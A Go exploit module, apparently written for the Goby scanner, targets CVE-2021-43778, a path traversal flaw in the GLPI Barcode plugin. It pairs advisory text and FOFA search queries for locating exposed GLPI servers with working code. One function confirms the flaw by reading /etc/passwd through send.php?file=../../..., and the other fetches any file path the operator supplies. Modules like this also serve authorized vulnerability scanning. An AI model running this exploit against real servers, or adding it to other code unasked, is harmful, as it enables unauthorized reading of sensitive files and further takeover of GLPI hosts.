package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "GLPI Barcode Arbitrary File Read(CVE-2021-43778)",
    "Description": "<p>Teclib GLPI is a set of IT asset management solutions.</p><p>The GLPI Barcode plug-in version between v2.x-2.61 has arbitrary file reading vulnerabilities. Attackers can inject ../ to read all readable files on the affected device to further take over the system.</p>",
    "Impact": "GLPI Barcode Arbitrary File Read(CVE-2021-43778)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/pluginsGLPI/barcode/security/advisories/GHSA-2pjh-h828-wcw9\">https://github.com/pluginsGLPI/barcode/security/advisories/GHSA-2pjh-h828-wcw9</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "GLPI",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "GLPI 资产管理系统 Barcode 插件存在任意文件读取漏洞（CVE-2021-43778）",
            "Description": "<p>Teclib GLPI是一套IT资产管理解决方案。</p><p>GLPI Barcode 插件 v2.x-2.61之间的版本存在任意文件读取漏洞，攻击者可以注入../来读取受影响设备上的所有可读文件进一步接管系统。</p>",
            "Impact": "<p>GLPI Barcode 插件 v2.x-2.61之间的版本存在任意文件读取漏洞，攻击者可以注入../来读取受影响设备上的所有可读文件进一步接管系统。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/pluginsGLPI/barcode/security/advisories/GHSA-2pjh-h828-wcw9\">https://github.com/pluginsGLPI/barcode/security/advisories/GHSA-2pjh-h828-wcw9</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "GLPI",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "GLPI Barcode Arbitrary File Read(CVE-2021-43778)",
            "Description": "<p>Teclib GLPI is a set of IT asset management solutions.</p><p>The GLPI Barcode plug-in version between v2.x-2.61 has arbitrary file reading vulnerabilities. Attackers can inject ../ to read all readable files on the affected device to further take over the system.</p>",
            "Impact": "GLPI Barcode Arbitrary File Read(CVE-2021-43778)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/pluginsGLPI/barcode/security/advisories/GHSA-2pjh-h828-wcw9\">https://github.com/pluginsGLPI/barcode/security/advisories/GHSA-2pjh-h828-wcw9</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Product": "GLPI",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "(body=\"href=\\\"/pics/favicon.ico\\\"\" && body=\"autofocus=\\\"autofocus\\\"\" && title=\"GLPI - 登陆入口\") || title=\"GLPI\"",
    "GobyQuery": "(body=\"href=\\\"/pics/favicon.ico\\\"\" && body=\"autofocus=\\\"autofocus\\\"\" && title=\"GLPI - 登陆入口\") || title=\"GLPI\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://glpi-project.org",
    "DisclosureDate": "2021-11-29",
    "References": [
        "https://github.com/pluginsGLPI/barcode/security/advisories/GHSA-2pjh-h828-wcw9"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-43778"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202111-2089"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "../../../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "GLPI"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10239"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/glpi/plugins/barcode/front/send.php?file=../../../../../../../etc/passwd"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && regexp.MustCompile("root:(x*?):0:0:").MatchString(resp.RawBody) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filepath"].(string)
			uri := "/glpi/plugins/barcode/front/send.php?file=" + cmd
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
